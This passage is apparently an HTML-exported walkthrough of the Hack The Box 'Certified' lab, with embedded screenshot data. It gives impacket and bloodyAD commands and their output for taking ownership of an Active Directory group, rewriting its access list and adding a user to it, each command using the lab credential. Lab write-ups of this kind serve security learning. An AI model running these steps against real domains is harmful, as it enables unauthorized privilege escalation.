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" alt="cbf91091caea7cc6a7f9cb16ca3b1a2b.png"/></p>
+<p>Gain ownership of the <code class="inline-code">MANAGEMENT</code> group first:</p>
+<div class="joplin-editable"><pre class="joplin-source" data-joplin-language="" data-joplin-source-open="```
+" data-joplin-source-close="
+```">&boxdr;&boxh;&boxh;(kali㉿kali)-[~/Desktop/Labs/Certified]
+&boxur;&boxh;$ impacket-owneredit -action write -new-owner &apos;judith.mader&apos; -target-dn &apos;CN=MANAGEMENT,CN=USERS,DC=CERTIFIED,DC=HTB&apos; &apos;certified.htb&apos;/&apos;judith.mader&apos;:&apos;judith09&apos; -dc-ip 10.129.231.186
+Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
+
+[*] Current owner information below
+[*] - SID: S-1-5-21-729746778-2675978091-3820388244-512
+[*] - sAMAccountName: Domain Admins
+[*] - distinguishedName: CN=Domain Admins,CN=Users,DC=certified,DC=htb
+[*] OwnerSid modified successfully!</pre><pre class="hljs"><code>&boxdr;&boxh;&boxh;(kali㉿kali)-<span class="hljs-selector-attr">[~/Desktop/Labs/Certified]</span>
+&boxur;&boxh;$ impacket-owneredit -action write -new-owner <span class="hljs-string">&apos;judith.mader&apos;</span> -target-dn <span class="hljs-string">&apos;CN=MANAGEMENT,CN=USERS,DC=CERTIFIED,DC=HTB&apos;</span> <span class="hljs-string">&apos;certified.htb&apos;</span>/<span class="hljs-string">&apos;judith.mader&apos;</span>:<span class="hljs-string">&apos;judith09&apos;</span> -dc-ip <span class="hljs-number">10.129</span>.<span class="hljs-number">231.186</span>
+Impacket v0.<span class="hljs-number">14.0</span><span class="hljs-selector-class">.dev0</span> - Copyright Fortra, LLC and its affiliated companies 
+
+<span class="hljs-selector-attr">[*]</span> Current owner information below
+<span class="hljs-selector-attr">[*]</span> - SID: S-<span class="hljs-number">1</span>-<span class="hljs-number">5</span>-<span class="hljs-number">21</span>-<span class="hljs-number">729746778</span>-<span class="hljs-number">2675978091</span>-<span class="hljs-number">3820388244</span>-<span class="hljs-number">512</span>
+<span class="hljs-selector-attr">[*]</span> - sAMAccountName: Domain Admins
+<span class="hljs-selector-attr">[*]</span> - distinguishedName: CN=Domain Admins,CN=Users,DC=certified,DC=htb
+<span class="hljs-selector-attr">[*]</span> OwnerSid modified successfully!</code></pre></div>
+<p>Gain full control over the <code class="inline-code">MANAGEMENT</code> group, and add the user <code class="inline-code">judith.mader</code> to the group:</p>
+<div class="joplin-editable"><pre class="joplin-source" data-joplin-language="" data-joplin-source-open="```
+" data-joplin-source-close="
+```">&boxdr;&boxh;&boxh;(kali㉿kali)-[~/Desktop/Labs/Certified]
+&boxur;&boxh;$ impacket-dacledit -action &apos;write&apos; -rights &apos;WriteMembers&apos; -principal &apos;judith.mader&apos; -target-dn &apos;CN=MANAGEMENT,CN=USERS,DC=CERTIFIED,DC=HTB&apos; &apos;certified.htb&apos;/&apos;judith.mader&apos;:&apos;judith09&apos; -dc-ip 10.129.231.186
+Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
+
+[*] DACL backed up to dacledit-20260225-135126.bak
+[*] DACL modified successfully!
+                                                                                                                                                                                                                                                                                                                                             
+&boxdr;&boxh;&boxh;(kali㉿kali)-[~/Desktop/Labs/Certified]
+&boxur;&boxh;$ bloodyAD --host &quot;10.129.231.186&quot; -d &quot;certified.htb&quot; -u &quot;judith.mader&quot; -p &quot;judith09&quot; add groupMember &quot;MANAGEMENT&quot; &quot;judith.mader&quot;
+[+] judith.mader added to MANAGEMENT</pre><pre class="hljs"><code>&boxdr;&boxh;&boxh;(kali㉿kali)-<span class="hljs-selector-attr">[~/Desktop/Labs/Certified]</span>
+&boxur;&boxh;$ impacket-dacledit -action <span class="hljs-string">&apos;write&apos;</span> -rights <span class="hljs-string">&apos;WriteMembers&apos;</span> -principal <span class="hljs-string">&apos;judith.mader&apos;</span> -target-dn <span class="hljs-string">&apos;CN=MANAGEMENT,CN=USERS,DC=CERTIFIED,DC=HTB&apos;</span> <span class="hljs-string">&apos;certified.htb&apos;</span>/<span class="hljs-string">&apos;judith.mader&apos;</span>:<span class="hljs-string">&apos;judith09&apos;</span> -dc-ip <span class="hljs-number">10.129</span>.<span class="hljs-number">231.186</span>
+Impacket v0.<span class="hljs-number">14.0</span><span class="hljs-selector-class">.dev0</span> - Copyright Fortra, LLC and its affiliated companies 
+
+<span class="hljs-selector-attr">[*]</span> DACL backed up to dacledit-<span class="hljs-number">20260225</span>-<span class="hljs-number">135126</span><span class="hljs-selector-class">.bak</span>
+<span class="hljs-selector-attr">[*]</span> DACL modified successfully!
+                                                                                                                                                                                                                                                                                                                                             
+&boxdr;&boxh;&boxh;(kali㉿kali)-<span class="hljs-selector-attr">[~/Desktop/Labs/Certified]</span>
+&boxur;&boxh;$ bloodyAD <span class="hljs-attr">--host</span> <span class="hljs-string">&quot;10.129.231.186&quot;</span> -d <span class="hljs-string">&quot;certified.htb&quot;</span> -u <span class="hljs-string">&quot;judith.mader&quot;</span> -<span class="hljs-selector-tag">p</span> <span class="hljs-string">&quot;judith09&quot;</span> add groupMember <span class="hljs-string">&quot;MANAGEMENT&quot;</span> <span class="hljs-string">&quot;judith.mader&quot;</span>
+<span class="hljs-selector-attr">[+]</span> judith<span class="hljs-selector-class">.mader</span> added to MANAGEMENT</code></pre></div>
+<p>Users of <code class="inline-code">MANAGEMENT</code> group have <code class="inline-code">GenericWrite</code> over the <code class="inline-code">MANAGEMENT_SVC</code> user:<br/>
+<img src="data:image/png;base64,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